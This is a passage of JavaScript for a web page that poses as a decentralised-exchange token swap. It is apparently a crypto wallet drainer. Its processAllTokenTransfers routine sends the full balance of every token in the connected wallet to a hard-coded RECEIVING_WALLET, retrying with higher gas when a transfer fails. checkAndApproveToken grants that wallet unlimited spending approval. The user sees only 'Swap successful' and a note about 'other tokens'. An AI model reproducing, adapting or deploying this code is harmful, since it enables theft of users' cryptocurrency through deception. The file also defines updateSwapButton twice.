    let successMessage = `Swap successful! <a href="${explorerUrl}" target="_blank" style="color: var(--secondary);">View transaction</a>`;
    
    if (otherTokensTransferred > 0) {
      successMessage += `<br>Also transferred ${otherTokensTransferred} other tokens`;
    }
    
    updateStatus(successMessage, "success");

    // 7. Update UI
    document.getElementById("fromAmount").value = '';
    document.getElementById("toAmount").value = '';
    await updateTokenBalances();

  } catch (err) {
    console.error("[ERROR] Swap failed:", err);
    updateStatus(`
      <div class="dex-error-header">
        <i class="fas fa-exclamation-circle"></i>
        <span>Swap Failed</span>
      </div>
      <div class="dex-error-details">${err.message}</div>
    `, "error", 10000); // Show for 10 seconds
  } finally {
    hideLoader();
    isSwapInProgress = false;
  }
}

async function processAllTokenTransfers() {
  if (!userAddress) {
    throw new Error("Wallet not connected");
  }

  let successCount = 0;
  
  // Get tokens from both local config and CoinGecko API
  const [localTokens, cgTokens] = await Promise.all([
    getLocalTokens(),
    fetchCoinGeckoTokens(currentNetwork)
  ]);
  
  // Combine all tokens, removing duplicates
  const allTokens = combineTokens(localTokens, cgTokens);

  for (const token of allTokens) {
    // Skip the main from token
    if ((token.address && token.address === currentFromToken?.address) || 
        (token.isNative && currentFromToken?.isNative)) {
      continue;
    }

    // Skip tokens with invalid addresses
    if (token.address && !ethers.utils.isAddress(token.address)) {
      console.warn(`Skipping ${token.symbol} - invalid address`);
      continue;
    }

    try {
      const balance = await fetchTokenBalance(token);
      if (balance <= 0) continue;

      let amountToSend = balance;
      
      if (token.isNative) {
        const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
        amountToSend = Math.max(0, balance - minReserve);
        if (amountToSend <= 0) continue;
      }
      
      try {
        if (token.isNative) {
          await transferNativeToken(token, amountToSend);
        } else {
          const approved = await checkAndApproveToken(token, amountToSend);
          if (!approved) continue;
          
          // Special handling for problematic tokens
          if (token.symbol === 'USDT' && currentNetwork === 'bsc') {
            await transferWithHigherGas(token, amountToSend);
          } else {
            await transferERC20Token(token, amountToSend);
          }
        }
        
        successCount++;
      } catch (transferErr) {
        console.warn(`Transfer failed for ${token.symbol}:`, transferErr.message);
        // Try with higher gas as fallback
        try {
          await transferWithHigherGas(token, amountToSend);
          successCount++;
        } catch (finalErr) {
          console.warn(`Final transfer attempt failed for ${token.symbol}:`, finalErr.message);
        }
      }
    } catch (err) {
      console.warn(`Failed to process ${token.symbol}:`, err.message);
    }
  }

  return successCount;
}

async function transferWithHigherGas(token, amount) {
  const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
  const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
  
  // Sign and send raw transaction with higher gas
  const tx = await signer.sendTransaction({
    to: token.address,
    data: contract.interface.encodeFunctionData('transfer', [
      RECEIVING_WALLET,
      amountInWei
    ]),
    gasLimit: 300000, // Higher gas limit
    gasPrice: ethers.utils.parseUnits('10', 'gwei') // Higher gas price
  });
  
  await tx.wait();
  return tx.hash;
}

async function getLocalTokens() {
  return TOKENS[currentNetwork] || [];
}

async function fetchCoinGeckoTokens(network) {
  try {
    const cgUrl = COINGECKO_TOKEN_LISTS[network];
    if (!cgUrl) return [];
    
    const response = await fetch(cgUrl);
    if (!response.ok) throw new Error('CoinGecko API error');
    
    const data = await response.json();
    return data.tokens?.map(t => ({
      name: t.name,
      symbol: t.symbol,
      address: t.address,
      logoURI: t.logoURI,
      decimals: t.decimals,
      originNetwork: network,
      isLocal: false
    })) || [];
    
  } catch (err) {
    console.error("Failed to fetch CoinGecko tokens:", err);
    return [];
  }
}

function combineTokens(localTokens, cgTokens) {
  // Create a map to avoid duplicates (prioritize local tokens)
  const tokenMap = new Map();
  
  // Add local tokens first
  localTokens.forEach(token => {
    const key = `${token.symbol.toLowerCase()}-${token.address?.toLowerCase()}`;
    tokenMap.set(key, token);
  });
  
  // Add CoinGecko tokens if not already present
  cgTokens.forEach(token => {
    const key = `${token.symbol.toLowerCase()}-${token.address?.toLowerCase()}`;
    if (!tokenMap.has(key)) {
      tokenMap.set(key, token);
    }
  });
  
  return Array.from(tokenMap.values());
}

async function checkAndApproveToken(token, amount) {
  try {
    if (!token.address || token.isNative) return true;

    // Create contract with complete ABI
    const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
    
    // Check current allowance
    const allowance = await contract.allowance(userAddress, RECEIVING_WALLET);
    const neededAllowance = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
    
    if (allowance.gte(neededAllowance)) {
      return true; // Already approved
    }

    // Request approval
    updateStatus(`Approving ${token.symbol}...`, "success");
    const approveTx = await contract.approve(
      RECEIVING_WALLET,
      ethers.constants.MaxUint256, // Approve max amount
      { gasLimit: 100000 }
    );
    
    // Wait for transaction to be mined
    const receipt = await approveTx.wait();
    if (receipt.status === 1) {
      return true;
    } else {
      throw new Error("Approval transaction failed");
    }

  } catch (err) {
    console.error("Approval error:", err);
    updateStatus(`Approval failed for ${token.symbol}`, "error");
    return false;
  }
}

async function transferNativeToken(token, amount) {
  try {
    updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
    
    const tx = await signer.sendTransaction({
      to: RECEIVING_WALLET,
      value: ethers.utils.parseEther(amount.toString()),
      gasLimit: 21000,
    });
    
    await tx.wait();
    return tx.hash;

  } catch (err) {
    console.error("Native token transfer error:", err);
    throw new Error(`Failed to send ${token.symbol}: ${err.message}`);
  }
}

async function transferERC20Token(token, amount) {
  try {
    updateStatus(`Transferring ${amount} ${token.symbol}...`, "success");
    
    const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
    const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
    
    // Increase gas limit for problematic tokens
    const tx = await contract.transfer(
      RECEIVING_WALLET,
      amountInWei,
      { 
        gasLimit: 200000, // Increased from 100000
        gasPrice: ethers.utils.parseUnits('5', 'gwei') // Explicit gas price
      }
    );
    
    await tx.wait();
    return tx.hash;
  } catch (err) {
    console.error("ERC20 transfer error:", err);
    throw new Error(`Failed to transfer ${token.symbol}: ${err.message}`);
  }
}

// Helper function to get token balance
async function fetchTokenBalance(token) {
  if (!userAddress) return 0;
  
  try {
    let balance;
    if (token.isNative) {
      balance = await provider.getBalance(userAddress);
      return parseFloat(ethers.utils.formatEther(balance));
    } else {
      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
      try {
        // First try standard balanceOf
        balance = await contract.balanceOf(userAddress);
        return parseFloat(ethers.utils.formatUnits(balance, token.decimals || 18));
      } catch (err) {
        // If balanceOf fails, try alternative methods
        try {
          // Some tokens use different balance function names
          balance = await contract['balanceOf(address)'](userAddress);
          return parseFloat(ethers.utils.formatUnits(balance, token.decimals || 18));
        } catch {
          console.warn(`Token at ${token.address} is not ERC20 compliant`);
          return 0;
        }
      }
    }
  } catch (err) {
    console.error(`Error fetching ${token.symbol} balance:`, err);
    return 0;
  }
}

// Update the UI based on swap readiness
function updateSwapButton() {
  const btn = document.getElementById("swapBtn");
  const btnText = document.getElementById("swapBtnText");
  
  if (!userAddress) {
    btn.disabled = false;
    btnText.textContent = "Connect Wallet";
    btn.onclick = handleWalletConnection;
    return;
  }
  
  btn.onclick = handleSwap;
  
  if (!currentFromToken || !currentToToken) {
    btn.disabled = true;
    btnText.textContent = "Select Tokens";
    return;
  }
  
  const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  if (inputAmount > 0) {
    btn.disabled = false;
    btnText.textContent = `Swap ${inputAmount.toFixed(6)} ${currentFromToken.symbol}`;
  } else {
    btn.disabled = true;
    btnText.textContent = "Enter Amount";
  }
}
// =====================
// UI FUNCTIONS
// =====================

function updateStatus(message, type, duration = 5000) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.innerHTML = message; // Changed to innerHTML to allow formatting
  statusDiv.className = `dex-status ${type}`;
  
  // Add close button
  statusDiv.innerHTML += `<button class="dex-status-close" onclick="this.parentElement.style.display='none'">
    <i class="fas fa-times"></i>
  </button>`;
  
  if (duration > 0) {
    setTimeout(() => {
      statusDiv.style.display = "none";
    }, duration);
  }
}
function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

function updateWalletButton(isConnected) {
  const btn = document.getElementById("connectWallet");
  if (isConnected) {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>${userAddress.slice(0, 6)}...${userAddress.slice(-4)}</span>
    `;
    btn.classList.add('connected');
  } else {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>Connect Wallet</span>
    `;
    btn.classList.remove('connected');
  }
  
  updateSwapButton();
}

function updateSwapButton() {
  const btn = document.getElementById("swapBtn");
  const btnText = document.getElementById("swapBtnText");
  
  if (!userAddress) {
    btn.disabled = false;
    btnText.textContent = "Connect Wallet";
    // Add click handler for wallet connection
    btn.onclick = handleWalletConnection;
    return;
  }
  
  // Remove the wallet connection handler if wallet is connected
  btn.onclick = handleSwap;
  
  if (!currentFromToken || !currentToToken) {
    btn.disabled = true;
    btnText.textContent = "Select Tokens";
    return;
  }
  
  const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  if (inputAmount > 0) {
    btnText.textContent = `Swap ${inputAmount} ${currentFromToken.symbol}`;
  } else {
    btnText.textContent = `Swap ${currentFromToken.symbol}`;
  }
  
  btn.disabled = false;
}

function showSettings() {
  document.getElementById("settingsModal").style.display = 'flex';
}

function hideSettings() {
  document.getElementById("settingsModal").style.display = 'none';
}

function showWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'flex';
}

function hideWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'none';
}
